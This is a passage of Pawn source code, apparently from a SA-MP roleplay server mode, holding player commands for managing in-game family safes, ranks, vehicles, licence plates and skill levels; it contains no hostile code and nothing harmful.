		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of pot from family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyCrack] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Your family doesn't have that much.");
			return 1;
		}
		if(PlayerInfo[playerid][pCrack] > 25)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You already have 25 grams of crack.");
			return 1;
		}
		new level = PlayerInfo[playerid][pDrugsSkill];
		if(level >= 0 && level < 50)
		{ if(amount < 1 || amount > 5) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 5 at your Skill Level!"); return 1; } }
		else if(level >= 50 && level < 100)
		{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 10 at your Skill Level!"); return 1; } }
		else if(level >= 100 && level < 200)
		{ if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 15 at your Skill Level!"); return 1; } }
		else if(level >= 200 && level < 400)
		{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 20 at your Skill Level!"); return 1; } }
		else if(level >= 400)
		{ if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 25 at your Skill Level!"); return 1; } }
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCrack] -= amount;
		PlayerInfo[playerid][pCrack] += amount;
		format(string, sizeof(string), "You have successfully withdrawn %d grams of crack from your family safe.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s withdraws some crack from their family safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of crack from family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	return 1;
}

CMD:adjust(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GREY, "You're not in a family.");

	if(PlayerInfo[playerid][pRank] >= 5) {
		new
		choice[32],
		opstring[100],
		family = PlayerInfo[playerid][pGang],
		string[128];

		if(sscanf(params, "s[32]S()[100]", choice, opstring)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjust [name]");
			SendClientMessage(playerid, COLOR_WHITE, "Available Names: Name, MOTD, Safe, Invite, Uninvite");
			return 1;
		}

		if(strcmp(choice,"name",true) == 0) {
			if(!opstring[0])
				return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjust name [family name]");

			if(strfind(opstring, "|", true) != -1)
				return SendClientMessage(playerid, COLOR_GRAD2,  "You can't use '|' in a family name.");

			if(strlen(opstring) >= 40)
				return SendClientMessage(playerid, COLOR_GRAD1, "That family name is too long, please refrain from using more than 40 characters.");

			for(new i = 0; i < MAX_POINTS; i++) {
				if(strcmp(Points[i][Owner], FamilyInfo[family][FamilyName], true) == 0) {
					strmid(Points[i][Owner], opstring, 0, strlen(opstring), 100);
				}
			}

			strmid(FamilyInfo[family][FamilyName], opstring, 0, strlen(opstring), 100);
			SaveFamilies();

			SendClientMessage(playerid, COLOR_WHITE, "You've adjusted your family's name.");
			format(string, sizeof(string), "%s adjusted family %d's name to %s", GetPlayerNameEx(playerid), family+1, opstring);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"motd",true) == 0) {
			if(!opstring[0])
				return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjust MOTD [family MOTD text]");

			if(strfind(opstring, "|", true) != -1)
				return SendClientMessage(playerid, COLOR_GRAD2,  "You can't use '|' in a family motd.");

			if(strlen(opstring) >= 60)
				return SendClientMessage(playerid, COLOR_GRAD1, "That MOTD is too long, please refrain from using more than 60 characters.");

			strmid(FamilyInfo[family][FamilyMOTD], opstring, 0, strlen(opstring), 100);
			SaveFamilies();
			SendClientMessage(playerid, COLOR_WHITE, "You've adjusted your family's MOTD.");
			format(string, sizeof(string), "%s adjusted family %d's MOTD to %s", GetPlayerNameEx(playerid), family+1, opstring);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"safe",true) == 0) {
			SendClientMessage(playerid, COLOR_GRAD1, "Adjusting your Family Safe will reset all your safe stats.");
			SendClientMessage(playerid, COLOR_GRAD1, "If you want to adjust your safe, type /adjust confirm.");
			SendClientMessage(playerid, COLOR_GRAD1, "Upgrading your family safe will cost $5,000.");
			return 1;
		} else if(strcmp(choice,"confirm",true) == 0) {
			if(GetPlayerCash(playerid) < 5000)
				return SendClientMessage(playerid, COLOR_GRAD1, "You don't have $5,000 to upgrade your family safe.");

			GivePlayerCash(playerid, -5000);
			GetPlayerPos(playerid, FamilyInfo[family][FamilySafe][0],FamilyInfo[family][FamilySafe][1],FamilyInfo[family][FamilySafe][2]);
			FamilyInfo[family][FamilyCash] = 0;
			FamilyInfo[family][FamilyMats] = 0;
			FamilyInfo[family][FamilyPot] = 0;
			FamilyInfo[family][FamilyCrack] = 0;
			if(FamilyInfo[family][FamilyUSafe]) DestroyPickup(FamilyInfo[family][FamilyPickup]);
			FamilyInfo[family][FamilyUSafe] = 1;
			FamilyInfo[family][FamilyPickup] = CreatePickup(1239, 23, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2], -1);
			SaveFamilies();
			SendClientMessage(playerid, COLOR_WHITE, "You've adjusted your family's Safe.");
			format(string, sizeof(string), "%s adjusted family %d's safe", GetPlayerNameEx(playerid), family+1);
			Log("logs/family.log", string);
			return 1;
		} else if(strcmp(choice,"invite",true) == 0) {
			if(!strlen(opstring))
				return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjust invite [playerid/partofname]");

			new
				giveplayerid = ReturnUser(opstring);
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pGang] == 255) {
					if(PlayerInfo[giveplayerid][pLeader] == 2 || PlayerInfo[giveplayerid][pFaction] == 2 && PlayerInfo[giveplayerid][pDivision] == 2) {
						format(string, sizeof(string), "* You've invited %s to join '%s'.",GetPlayerNameEx(giveplayerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s has invited you to join '%s'. (type /accept family)",GetPlayerNameEx(playerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						InviteFaction[giveplayerid] = 0;
						InviteOffer[giveplayerid] = playerid;
						InviteFamily[giveplayerid] = family;

						format(string, sizeof(string), "%s invited %s (FBI agent) to family %d ", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
						Log("logs/family.log", string);
						return 1;
					} else if(PlayerInfo[giveplayerid][pLeader] == 0 && PlayerInfo[giveplayerid][pFaction] == 0) {
						format(string, sizeof(string), "* You've invited %s to join '%s'.",GetPlayerNameEx(giveplayerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s has invited you to join '%s'. (type /accept family)",GetPlayerNameEx(playerid), FamilyInfo[family][FamilyName]);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						InviteFaction[giveplayerid] = 0;
						InviteOffer[giveplayerid] = playerid;
						InviteFamily[giveplayerid] = family;
						format(string, sizeof(string), "%s invited %s to family %d ", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
						Log("logs/family.log", string);
						return 1;
					} else SendClientMessage(playerid, COLOR_GREY, "That player is already in a family/faction.");
				} else SendClientMessage(playerid, COLOR_GREY, "That player is already in a family/faction.");
			} else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		} else if(strcmp(choice,"uninvite",true) == 0) {
			if(!strlen(opstring))
				return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjust uninvite [playerid/partofname]");

			new
				giveplayerid = ReturnUser(opstring);

			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pGang] != family)
					return SendClientMessage(playerid, COLOR_GREY, "That player isn't in your family.");

				if(PlayerInfo[giveplayerid][pRank] > PlayerInfo[playerid][pRank])
					return SendClientMessage(playerid, COLOR_GREY, "You can't uninvite higher ranks.");

				format(string, sizeof(string), "* You've kicked %s out of your family.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Family leader %s has kicked your out of the family.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[giveplayerid][pGang] = 255;
				PlayerInfo[giveplayerid][pRank] = 0;
				FamilyInfo[family][FamilyMembers] --;
				SaveFamilies();
				format(string, sizeof(string), "%s uninvited %s from family %d ", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
				Log("logs/family.log", string);
				return 1;
			} else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		} else if(strcmp(choice,"rank",true) == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "Error! Please use /adjustrank instead of /adjust rank.");
		} else if(strcmp(choice,"rankname",true) == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "Error! Please use /adjustrankname instead of /adjust rankname.");
		}
	} else SendClientMessage(playerid, COLOR_GREY, "   You're not high rank enough to use this command!");
	return 1;
}

CMD:adjustrank(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GREY, "You're not in a family.");

	new
		string[128],
		rank,
		giveplayerid;

	if(sscanf(params, "du", rank, giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjustrank [RankNr] [playerid/partofname]");


	if(PlayerInfo[playerid][pRank] >= 5) {
		if(rank < 1 || rank > PlayerInfo[playerid][pRank]) {
		    format(string, sizeof(string),"Rank number must be from 1 to %d.", PlayerInfo[playerid][pRank]);
			return SendClientMessage(playerid, COLOR_GREY, string);
		}

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pGang] != PlayerInfo[playerid][pGang])
				return SendClientMessage(playerid, COLOR_GREY, "That player isn't in your family.");

			if(PlayerInfo[giveplayerid][pRank] > PlayerInfo[playerid][pRank])
				return SendClientMessage(playerid, COLOR_GREY, "You can't adjust higher ranks.");

			format(string, sizeof(string), "* You've given %s rank %d.",GetPlayerNameEx(giveplayerid), rank);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "* Family leader %s has given you rank %d.",GetPlayerNameEx(playerid),rank);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "%s set %s rank from %d to %d in family %d", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid),PlayerInfo[giveplayerid][pRank], rank, (PlayerInfo[playerid][pGang]+1));
			Log("logs/family.log", string);
			PlayerInfo[giveplayerid][pRank] = rank;
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	} else SendClientMessage(playerid, COLOR_GREY, "   You're not high rank enough to use this command!");
	return 1;
}

CMD:phoneprivacy(playerid, params[])
{
    if(PlayerInfo[playerid][pNumber] != 0 && PlayerInfo[playerid][pVip] >= 1)
	{
        if(PhonePrivacy[playerid] == 1)
		{
            PhonePrivacy[playerid] = 0;
            SendClientMessage(playerid, COLOR_WHITE, "You have disabled the phone privacy feature.");
        }
        else
		{
            PhonePrivacy[playerid] = 1;
            SendClientMessage(playerid, COLOR_WHITE, "You have enabled the phone privacy feature.");
        }
    } else SendClientMessage(playerid, COLOR_GREY, "This command is only available to VIP and current phone owners.");
    return 1;
}

CMD:changeplates(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "This command is only available to VIP right now.");

	new
		color[32],
	    plate[32];

	if(sscanf(params, "s[32]s[32]", color, plate))
	{
        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /changeplates [color] [new plate]");
		SendClientMessage(playerid, COLOR_GREY, "Available colors: {EFEFEF}default, black, white, blue, red, green, purple");
		SendClientMessage(playerid, COLOR_GREY, "{EFEFEF}yellow, lightblue, darkgreen, darkblue, darkgrey, darkbrown, pink");
		return 1;
	}
	new
	    Float: fVehicleHealth,
		iCount;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
		    iCount = 1;

		    GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], fVehicleHealth);

		    if(fVehicleHealth < 800)
		        return SendClientMessage(playerid, COLOR_GREY, "Your vehicle needs to have 800 HP before you can change the plates on it.");

			if(strlen(plate) > 8)
			    return SendClientMessage(playerid, COLOR_GREY, "The license plate can not be longer than 8 characters!");

			mysql_escape_string(plate, plate,32,sqldb);

			if(strcmp(color, "black", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{000000}%s", plate);
			else if(strcmp(color, "white", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FFFFFF}%s", plate);
			else if(strcmp(color, "blue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{2641FE}%s", plate);
			else if(strcmp(color, "red", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{AA3333}%s", plate);
			else if(strcmp(color, "green", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{33AA33}%s", plate);
			else if(strcmp(color, "purple", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{C2A2DA}%s", plate);
			else if(strcmp(color, "yellow", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FFFF00}%s", plate);
			else if(strcmp(color, "lightblue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{33CCFF}%s", plate);
			else if(strcmp(color, "darkgreen", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{2D6F00}%s", plate);
			else if(strcmp(color, "darkblue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{0B006F}%s", plate);
			else if(strcmp(color, "darkgrey", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{525252}%s", plate);
			else if(strcmp(color, "gold", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{B46F00}%s", plate);
			else if(strcmp(color, "darkbrown", true)==0||strcmp(color, "dennell", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{814F00}%s", plate);
			else if(strcmp(color, "darkred", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{750A00}%s", plate);
			else if(strcmp(color, "pink", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FF51F1}%s", plate);
			else strmid(PlayerVehicleInfo[playerid][d][pvNumberPlate], plate, 0, strlen(plate), 32);

		    GetPlayerPos(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		    GetVehicleZAngle(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_r]);

		    cmd_park(playerid, params);
		    //UpdatePlayerVehicleParkPosition(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z], PlayerInfo[playerid][pPos_r], 1000.0);
		}
	}

	if(iCount != 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You need to be inside of the vehicle you want to change the plates on.");

	return 1;
}

CMD:adjustrankname(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not in a family.");
		return 1;
	}
	new family = PlayerInfo[playerid][pGang];
	new string[128], rank, rankname[32];
	if(sscanf(params, "ds[32]", rank, rankname)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /adjustrankname [rank number 1-6] [rank name]");

	if(PlayerInfo[playerid][pRank] == 6)
	{
		if(rank < 1 || rank > 6)
		{
			SendClientMessage(playerid, COLOR_GREY, "Rank number must be from 1 to 6.");
			return 1;
		}
		if(strlen(rankname) >= 19)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "That rank name is too long, please refrain from using more than 19 characters.");
			return 1;
		}
		if(rank == 1)
		{
			strmid(FamilyInfo[family][FamilyRank1], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 1 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 2)
		{
			strmid(FamilyInfo[family][FamilyRank2], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 2 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 3)
		{
			strmid(FamilyInfo[family][FamilyRank3], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 3 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 4)
		{
			strmid(FamilyInfo[family][FamilyRank4], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 4 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 5)
		{
			strmid(FamilyInfo[family][FamilyRank5], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 5 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 6)
		{
			strmid(FamilyInfo[family][FamilyRank6], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* You have changed Rank 6 to %s.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}

		format(string, sizeof(string), "%s adjusted family %d's rank %d to %s", GetPlayerNameEx(playerid), family+1, rank, rankname);
		Log("logs/family.log", string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not high rank enough to use this command!");
		return 1;
	}
	return 1;
}

CMD:gpark(playerid, params[])
{
	new string[128];

    new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "You're not in a family.");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "You need to be at least rank 5 in the family.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
 	{
	    if(IsPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId]))
	    {
    		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "You must be in the driver seat.");
	        new Float:x, Float:y, Float:z, Float:angle, Float:health;
	        GetVehicleHealth(FamilyVehicleInfo[f][d][fvId], health);
	        if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " The vehicle is too damaged to park it.");
	        if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
            GetVehiclePos(FamilyVehicleInfo[f][d][fvId], x, y, z);
           	GetVehicleZAngle(FamilyVehicleInfo[f][d][fvId], angle);
            SurfingCheck(GetPlayerVehicleID(playerid));
            UpdateGangVehicleParkPosition(f, d, x, y, z, angle, health, 1);
  			FamilyVehicleInfo[f][d][fvSpawnx] = x;
			FamilyVehicleInfo[f][d][fvSpawny] = y;
			FamilyVehicleInfo[f][d][fvSpawnz] = z;
			FamilyVehicleInfo[f][d][fvSpawna] = angle;
			PutPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId], 0);
            format(string, sizeof(string), "* %s has parked their vehicle.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SaveFamiliesHQ();
            return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, " You need to be inside a vehicle that you own.");
	return 1;
}

CMD:gvlock(playerid, params[])
{
    new Float: x, Float: y, Float: z;
	new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "You're not in a family.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
    {
		if(FamilyVehicleInfo[f][d][fvId] != 0) GetVehiclePos(FamilyVehicleInfo[f][d][fvId], x, y, z);
  		if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
    	{
        	if(FamilyVehicleInfo[f][d][fvLock] > 0 && FamilyVehicleInfo[f][d][fvLocked] == 0)
         	{
          		GameTextForPlayer(playerid,"~r~Vehicle Locked!",5000,6);
            	PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
             	FamilyVehicleInfo[f][d][fvLocked] = 1;
              	LockGangVehicle(f, FamilyVehicleInfo[f][d][fvId], FamilyVehicleInfo[f][d][fvLock]);
               	return 1;
			}
			else if(FamilyVehicleInfo[f][d][fvLock] > 0 && FamilyVehicleInfo[f][d][fvLocked] == 1)
   			{
      			GameTextForPlayer(playerid,"~g~Vehicle Unlocked!",5000,6);
         		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
           		FamilyVehicleInfo[f][d][fvLocked] = 0;
             	UnLockGangVehicle(f, FamilyVehicleInfo[f][d][fvId], FamilyVehicleInfo[f][d][fvLock]);
              	return 1;
			}
   			SendClientMessage(playerid, COLOR_GREY, " You don't have a lock system installed on this vehicle.");
      		return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "You're not near any vehicle that your family owns.");
	return 1;
}

CMD:gbuylock(playerid, params[])
{
    if(!IsAt247(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a 24-7!");
		return 1;
	}
	if(PlayerInfo[playerid][pGang] != 255 && PlayerInfo[playerid][pRank] >= 6)
	{
		ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKBUY, DIALOG_STYLE_LIST, "24/7", "Alarm Lock		$1000\nIndustrial Lock		$5000", "Buy", "Cancel");
	}
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "You need to be in a family and have rank 6 to use this command.");
	}
	return 1;
}

CMD:skill(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /skill [number]");
		SendClientMessage(playerid, COLOR_GREY, "| 1: Detective											         7: Car Mechanic");
		SendClientMessage(playerid, COLOR_GREY, "| 2: Lawyer												           8: Boxer");
		SendClientMessage(playerid, COLOR_GREY, "| 3: Whore												            9: Fishing");
		SendClientMessage(playerid, COLOR_GREY, "| 4: Drugs Dealer										   10: Trucker");
		SendClientMessage(playerid, COLOR_GREY, "| 5: Drug Smuggler										11: Car Jacker	");
		SendClientMessage(playerid, COLOR_GREY, "| 6: Arms Dealer");
		//SendClientMessage(playerid, COLOR_GREY, "| 6: Arms Dealer											   12: Craftsman");
		return 1;
	}
	else switch(strval(params)) {
		case 1: //Detective
		{
			new level = PlayerInfo[playerid][pDetSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 1."); format(string, sizeof(string), "You need to find %d more people to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 2."); format(string, sizeof(string), "You need to find %d more people to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 3."); format(string, sizeof(string), "You need to find %d more people to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 4."); format(string, sizeof(string), "You need to find %d more people to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill Level = 5."); }
		}
		case 2://Lawyer
		{
			new level = PlayerInfo[playerid][pLawSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 1."); format(string, sizeof(string), "You need to free %d more people to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 2."); format(string, sizeof(string), "You need to free %d more people to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 3."); format(string, sizeof(string), "You need to free %d more people to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 4."); format(string, sizeof(string), "You need to free %d more people to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Lawyer Skill Level = 5."); }
		}
		case 3://Whore
		{
			new level = PlayerInfo[playerid][pSexSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Whore Skill Level = 1."); format(string, sizeof(string), "You need to have sex %d time(s) more to level up.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Whore Skill Level = 2."); format(string, sizeof(string), "You need to have sex %d time(s) more to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Whore Skill Level = 3."); format(string, sizeof(string), "You need to have sex %d time(s) more to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Whore Skill Level = 4."); format(string, sizeof(string), "You need to have sex %d time(s) more to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Whore Skill Level = 5."); }
		}
		case 4://Drugs Dealer
		{
			new level = PlayerInfo[playerid][pDrugsSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 1."); format(string, sizeof(string), "You need to sell drugs %d time(s) more to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 2."); format(string, sizeof(string), "You need to sell drugs %d time(s) more to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 3."); format(string, sizeof(string), "You need to sell drugs %d time(s) more to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 4."); format(string, sizeof(string), "You need to sell drugs %d time(s) more to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Dealer Skill Level = 5."); }
		}
		case 5://Drug Smuggling
		{
			new level = PlayerInfo[playerid][pSmugSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Smuggling Skill Level = 1."); format(string, sizeof(string), "You need to smuggle %d more drug crate(s) to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Smuggling Skill Level = 2."); format(string, sizeof(string), "You need to smuggle %d more drug crate(s) to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Smuggling Skill Level = 3."); format(string, sizeof(string), "You need to smuggle %d more drug crate(s) to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Smuggling Skill Level = 4."); format(string, sizeof(string), "You need to smuggle %d more drug crate(s) to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Drug Smuggling Skill Level = 5."); }
		}
		case 6://Arms Dealer
		{
			new level = PlayerInfo[playerid][pArmsSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 1."); format(string, sizeof(string), "You need to sell %d more gun(s) to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
